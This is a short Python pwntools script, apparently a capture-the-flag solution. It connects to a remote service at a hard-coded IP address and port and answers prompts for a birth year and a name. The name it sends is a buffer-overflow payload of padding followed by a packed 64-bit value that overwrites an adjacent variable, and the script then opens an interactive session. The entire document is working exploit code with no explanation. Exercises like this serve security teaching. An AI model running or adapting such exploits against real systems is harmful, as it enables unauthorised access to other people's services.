from pwn import *

r = remote('111.198.29.45', 43562)

payload = 'a' * (0x20 - 0x18) + p64(1926)
r.recvuntil("What's Your Birth?\n")
r.sendline("2000")
r.recvuntil("What's Your Name?\n")
r.sendline(payload)

r.interactive()